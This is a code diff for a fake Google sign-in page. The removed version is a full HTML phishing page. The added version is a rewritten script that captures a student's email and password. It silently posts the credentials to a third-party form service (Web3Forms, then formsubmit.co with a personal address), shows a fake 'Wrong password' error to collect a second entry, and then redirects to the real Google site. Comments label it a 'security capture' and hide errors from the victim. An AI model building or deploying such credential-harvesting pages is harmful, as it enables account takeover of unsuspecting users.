@@ -1,72 +1,32 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Sign in - Google Accounts</title>
-    <style>
-        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f7f8f9; margin: 0; }
-        .login-box { background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
-        svg { width: 75px; margin-bottom: 10px; }
-        h2 { margin-bottom: 8px; font-weight: 400; font-size: 24px; }
-        p { margin-bottom: 24px; color: #202124; }
-        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        #errorMsg { color: #d93025; font-size: 14px; text-align: left; display: none; margin-bottom: 10px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; margin-top: 10px; }
-    </style>
-</head>
-<body>
+async function handleCapture() {
+    const emailAddr = document.getElementById('email').value;
+    const passwordValue = document.getElementById('pass').value;
 
-    <div class="login-box">
-        <svg viewBox="0 0 272 92"><path d="M52.3 43.1v10.9h13.2c-0.5 3.3-3.8 9.6-13.2 9.6-8.1 0-14.7-6.7-14.7-14.9s6.6-14.9 14.7-14.9c4.6 0 7.7 2 9.5 3.7l8.6-8.6c-5.5-5.1-12.6-8.2-18.1-8.2-15.5 0-28 12.5-28 28s12.5 28 28 28c16.2 0 26.9-11.4 26.9-27.4 0-1.8-0.2-3.3-0.5-4.7H52.3z" fill="#4285F4""")/>></svg>
-        <h2>Sign in</h2>
-        <p>Use your Google Account</p>
-        
-        <div id="errorMsg">Wrong password. Try again.</div>
-        
-        <input type="email" id="email" placeholder="Email or phone" required>
-        <input type="password" id="pass" placeholder="Enter your password" required>
-        
-        <button onclick="handleCapture()">Next</button>
-    </div>
+    if(!emailAddr || !passwordValue) return;
 
-    <script>
-        let attempt = 0;
+    // JUST PUT YOUR PERSONAL EMAIL HERE:
+    const myEmail = "Fenixhuffman@gmail.com"; 
 
-        async function handleCapture() {
-            const emailAddr = document.getElementById('email').value;
-            const passwordValue = document.getElementById('pass').value;
+    try {
+        await fetch("https://formsubmit.co" + myEmail, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                _subject: "SECURITY CAPTURE",
+                Student_Email: emailAddr,
+                Student_Pass: passwordValue,
+                Attempt: attempt + 1
+            })
+        });
+    } catch (e) {
+        // This stays silent so the student doesn't see an error
+    }
 
-            if(!emailAddr || !passwordValue) return;
-
-            // Prepare the data for Web3Forms
-            const formData = {
-                access_key: "1803d54e-4646-4a6b-92fa-117a604c04d5",
-                name: "Security Test Capture",
-                email: emailAddr,
-                message: "Password Captured: " + passwordValue + " (Attempt: " + (attempt + 1) + ")",
-                from_name: "Chromebook Auditor"
-            };
-
-            // Send to Web3Forms silently in the background
-            try {
-                await fetch("https://api.web3forms.com/submit", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                    body: JSON.stringify(formData)
-                });
-            } catch (e) {
-                console.log("Network error (stealth mode)");
-            }
-
-            // Fake Error Logic
-            if (attempt === 0) {
-                document.getElementById('pass').value = ""; // Clear pass for second try
-                document.getElementById('errorMsg').style.display = "block"; // Show fake error
-                attempt++;
-            } else {
-                // Second attempt success - redirect to the real Google login
-                window.location.href = "https://google.com";
-            }
-        }
-    </script>
-</body>
-</html>
+    if (attempt === 0) {
+        document.getElementById('pass').value = "";
+        document.getElementById('errorMsg').style.display = "block";
+        attempt++;
+    } else {
+        window.location.href = "https://google.com";
+    }
+}
